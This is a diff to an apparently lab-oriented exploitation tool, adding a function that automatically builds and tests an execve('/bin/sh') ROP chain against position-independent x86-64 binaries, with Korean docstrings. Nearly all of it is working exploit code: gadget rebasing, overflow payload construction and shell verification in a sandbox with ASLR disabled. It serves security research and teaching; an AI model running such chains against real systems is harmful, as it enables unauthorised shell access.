@@ -21,6 +21,7 @@ from pathlib import Path
 
 from pwnable_lab.analyzer.strategy import (
     binary_exec_range,
+    execve_plan,
     find_ret_gadget,
     is_pie,
     ret2system_plan,
@@ -181,6 +182,100 @@ def auto_ret2system_pie(
             resolution, plan, alignment, True, "control-into-system", proof_dict
         )
     return _report_system(resolution, plan, False, False, "did-not-spawn-shell", None)
+
+
+_SYS_EXECVE = 59
+
+
+def auto_execve_pie(
+    binary_path: str, *, offset: int, limits: SandboxLimits | None = None
+) -> dict:
+    """PIE 바이너리에 대해 base 를 관측·rebase 하여 execve syscall ROP 를 검증한다.
+
+    ``system`` 이 없는 PIE(주로 정적 링크)라도 클린 ``pop`` 가젯·``/bin/sh``·
+    ``syscall`` 가젯이 있으면(:func:`execve_plan`) 로드 base 를 로컬 관측해 전부
+    rebase 하고, 같은 ASLR-off 조건에서 PTY 로 셸을 증명한다(:mod:`sandbox.execve`
+    의 PIE 판). 모든 재료가 바이너리 내부라 syscall 도 in-binary 이며, 성공 판정은
+    셸 획득뿐이다(외부 libc 로의 제어 이전 폴백은 execve 에 해당 없음).
+    """
+
+    image = parse_elf(Path(binary_path).read_bytes())
+    if (image.bits or 64) != 64:
+        return {"attempted": False, "reason": "pie-amd64-only"}
+    if not is_pie(image):
+        return {"attempted": False, "reason": "not-pie"}
+    plan = execve_plan(image)
+    if plan is None:
+        return {"attempted": False, "reason": "no-execve-plan"}
+
+    limits = limits or SandboxLimits()
+    resolution = resolve_pie_base(binary_path, limits=limits)
+    if not resolution.confirmed or resolution.base is None:
+        return {
+            "attempted": True,
+            "technique": "execve-pie",
+            "succeeded": False,
+            "reason": "pie-base-unresolved",
+            "base_resolution": resolution.as_dict(),
+        }
+
+    base = resolution.base
+    # execve("/bin/sh", 0, 0): 모든 가젯·문자열을 관측 base 로 rebase 한다.
+    chain = [
+        RopStep(base + plan["binsh"]),
+        RopStep(base + plan["pop_rsi"]),
+        RopStep(0),
+        RopStep(base + plan["pop_rdx"]),
+        RopStep(0),
+        RopStep(base + plan["pop_rax"]),
+        RopStep(_SYS_EXECVE),
+        RopStep(base + plan["syscall"]),
+    ]
+    payload = build_overflow(offset, base + plan["pop_rdi"], bits=64, chain=chain)
+    marker = "PWNPILOT_" + secrets.token_hex(4)
+    proof = verify_shell(
+        binary_path, payload, marker=marker, limits=limits, disable_aslr=True
+    )
+    if proof.shell_spawned:
+        return _report_execve(resolution, plan, True, "shell-proven", proof.as_dict())
+    return _report_execve(
+        resolution, plan, False, "did-not-spawn-shell", proof.as_dict()
+    )
+
+
+def _report_execve(
+    resolution: PieBaseResolution,
+    plan: dict,
+    succeeded: bool,
+    reason: str,
+    proof: dict | None,
+) -> dict:
+    base = resolution.base
+
+    def _rt(key: str) -> str | None:
+        return None if base is None else f"0x{base + plan[key]:x}"
+
+    report: dict = {
+        "attempted": True,
+        "technique": "execve-pie",
+        "pop_rdi_offset_hex": f"0x{plan['pop_rdi']:x}",
+        "pop_rsi_offset_hex": f"0x{plan['pop_rsi']:x}",
+        "pop_rdx_offset_hex": f"0x{plan['pop_rdx']:x}",
+        "pop_rax_offset_hex": f"0x{plan['pop_rax']:x}",
+        "binsh_offset_hex": f"0x{plan['binsh']:x}",
+        "syscall_offset_hex": f"0x{plan['syscall']:x}",
+        "base_hex": None if base is None else f"0x{base:x}",
+        "binsh_runtime_hex": _rt("binsh"),
+        "syscall_runtime_hex": _rt("syscall"),
+        "shell_proven": reason == "shell-proven",
+        "succeeded": succeeded,
+        "reason": reason,
+        "aslr": "disabled-for-local-proof",
+        "base_resolution": resolution.as_dict(),
+    }
+    if proof is not None:
+        report["shell_proof"] = proof
+    return report
 
 
 def _report_system(
